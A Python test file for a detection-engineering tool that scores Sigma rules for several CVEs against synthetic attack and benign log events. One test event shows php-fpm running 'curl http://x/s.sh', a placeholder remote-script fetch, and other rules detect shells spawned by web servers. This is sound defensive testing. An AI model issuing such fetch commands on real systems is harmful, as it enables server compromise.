from dataclasses import replace
from datetime import date
from pathlib import Path

from exception_guardian.config import load_config
from exception_guardian.find import run_find
from exception_guardian.guard.logtest import load_events, rule_matches, score_rule
from exception_guardian.guard.run import run_guard

LIVEWIRE = Path("samples/golden/drafts/CVE-2025-54068.yml").read_text()
WEB = Path("samples/golden/drafts/CVE-2025-54068-web.yml").read_text()


def _ev(**kw):
    return {"_logsource": "process_creation/linux", **kw}


def test_contains_endswith_and_all_of():
    hit = _ev(ParentImage="/usr/sbin/php-fpm8.2", Image="/usr/bin/curl", CommandLine="curl http://x/s.sh")
    wrong_parent = _ev(ParentImage="/usr/sbin/nginx", Image="/usr/bin/curl")
    wrong_child = _ev(ParentImage="/usr/sbin/php-fpm8.2", Image="/usr/bin/convert")
    assert rule_matches(LIVEWIRE, hit) is True
    assert rule_matches(LIVEWIRE, wrong_parent) is False and rule_matches(LIVEWIRE, wrong_child) is False


def test_matching_is_case_insensitive_and_numbers_match_strings():
    assert rule_matches(LIVEWIRE, _ev(ParentImage="/USR/SBIN/PHP-FPM", Image="/BIN/SH")) is True
    post = {"_logsource": "webserver", "cs-method": "POST", "cs-uri-stem": "/livewire/update", "sc-status": "500"}
    assert rule_matches(WEB, post) is True
    assert rule_matches(WEB, post | {"sc-status": 200}) is False
    assert rule_matches(WEB, {k: v for k, v in post.items() if k != "sc-status"}) is False


def test_not_and_one_of_and_keywords():
    rule = """title: t
id: 11111111-1111-4111-8111-111111111111
logsource: {category: process_creation, product: linux}
detection:
    sel_a: {Image|endswith: '/sh'}
    sel_b: {Image|endswith: '/bash'}
    filter: {ParentImage|startswith: '/usr/sbin/cron'}
    kw: ['evil-marker']
    condition: (1 of sel_* and not filter) or kw
"""
    assert rule_matches(rule, _ev(Image="/bin/bash", ParentImage="/usr/sbin/sshd")) is True
    assert rule_matches(rule, _ev(Image="/bin/bash", ParentImage="/usr/sbin/cron")) is False
    assert rule_matches(rule, _ev(Image="/usr/bin/ls", CommandLine="ls evil-marker x")) is True


def test_unsupported_construct_is_reported_not_guessed():
    rule = """title: t
id: 22222222-2222-4222-8222-222222222222
logsource: {category: process_creation, product: linux}
detection:
    sel: {Image|fieldref: ParentImage}
    condition: sel
"""
    s = score_rule(rule, [_ev(Image="/bin/sh", ParentImage="/bin/sh", _label="benign")], ("CVE-2025-54068",))
    assert s["tested"] is False and "unsupported" in s["reason"]


def test_score_counts_only_relevant_attacks_and_same_logsource():
    events = [
        _ev(_label="attack", _attack=["CVE-2025-54068"], ParentImage="/usr/sbin/php-fpm", Image="/bin/sh"),
        _ev(_label="attack", _attack=["CVE-2025-62593"], ParentCommandLine="raylet", Image="/bin/sh"),
        _ev(_label="benign", ParentImage="/usr/sbin/php-fpm", Image="/usr/bin/convert"),
        {"_logsource": "webserver", "_label": "benign", "cs-method": "GET"},
    ]
    s = score_rule(LIVEWIRE, events, ("CVE-2025-54068",))
    assert s == {"tested": True, "attack_hits": 1, "attack_total": 1, "benign_hits": 0, "benign_total": 1,
                 "benign_hit_notes": [], "logsource": "process_creation/linux", "agent_events": 0}


def test_no_sample_logs_for_logsource():
    s = score_rule(WEB, [_ev(_label="benign", Image="/bin/sh")], ("CVE-2025-54068",))
    assert s["tested"] is False and s["reason"] == "no sample logs for webserver"


def test_bundled_sample_logs_score_the_golden_drafts():
    events = load_events(Path("samples/logs"))
    assert all(e.get("_label") in ("attack", "benign") for e in events)
    s = score_rule(LIVEWIRE, events, ("CVE-2025-54068",))
    assert s["tested"] and s["attack_hits"] == s["attack_total"] >= 3
    assert s["benign_hits"] == 1 and "composer" in s["benign_hit_notes"][0].lower()  # the listed false positive
    ray = score_rule(Path("samples/golden/drafts/CVE-2025-62593.yml").read_text(), events, ("CVE-2025-62593",))
    assert ray["attack_hits"] == ray["attack_total"] >= 3 and ray["benign_hits"] == 0


def test_guard_records_scores_and_brief_says_tested(tmp_path):
    cfg = replace(load_config("guardian.yaml"), offline=True)
    run_find(cfg, tmp_path, date(2026, 11, 2))
    g = run_guard(tmp_path, Path("samples/golden/drafts"), cfg)
    drafted = next(r for r in g["R-HERO-001"]["rules"] if r["file"] == "CVE-2025-54068.yml")
    assert drafted["tested"]["tested"] and drafted["tested"]["attack_hits"] >= 3
    brief = (tmp_path / "hunt-briefs/R-HERO-001.md").read_text()
    assert "tested on synthetic sample logs: fires on" in brief
    windows = next(r for r in g["R-CRUSH-003"]["rules"] if r["file"])
    # Windows sample logs exist now: the CrushFTP rule is scored, and a source with no samples still says so
    assert windows["tested"]["tested"] and windows["tested"]["attack_hits"] >= 1
    from exception_guardian.guard.logtest import load_events, score_rule
    from exception_guardian.guard.sigmahq import BUNDLE
    sec = score_rule((BUNDLE / "win_security_exploit_cve_2020_1472.yml").read_text(),
                     load_events(Path("samples/logs")), ("CVE-2020-1472",))
    assert sec["tested"] is False and "no sample logs" in sec["reason"]


def test_sample_logs_dir_from_config(tmp_path):
    cfg_file = tmp_path / "g.yaml"
    cfg_file.write_text("sample_logs_dir: my/logs\n")
    assert load_config(cfg_file).sample_logs_dir == "my/logs"
    assert load_config("guardian.yaml").sample_logs_dir == "samples/logs"


def test_brief_label_names_the_benign_hit(tmp_path):
    cfg = replace(load_config("guardian.yaml"), offline=True)
    run_find(cfg, tmp_path, date(2026, 11, 2))
    run_guard(tmp_path, Path("samples/golden/drafts"), cfg)
    brief = (tmp_path / "hunt-briefs/R-HERO-001.md").read_text()
    assert "fires on 4 of 4 attack samples, 1 of 11 benign" in brief and "Composer" in brief
    # a generic rule is scored on every attack of its log source (any CVE), not only this exception's
    assert "generic SigmaHQ rule, tested on synthetic sample logs: fires on 0 of 7 attack samples" in brief


def test_service_based_rule_names_its_service_in_the_reason():
    from exception_guardian.guard.logtest import score_rule
    y = """title: t
id: 0b4c6c1e-2f43-4e4a-9a5b-1a2b3c4d5e6f
logsource:
  product: windows
  service: security
detection:
  sel:
    EventID: 4742
  condition: sel
"""
    assert score_rule(y, [], ("CVE-2020-1472",)) == {"tested": False, "reason": "no sample logs for windows/security",
                                                    "logsource": "windows/security"}
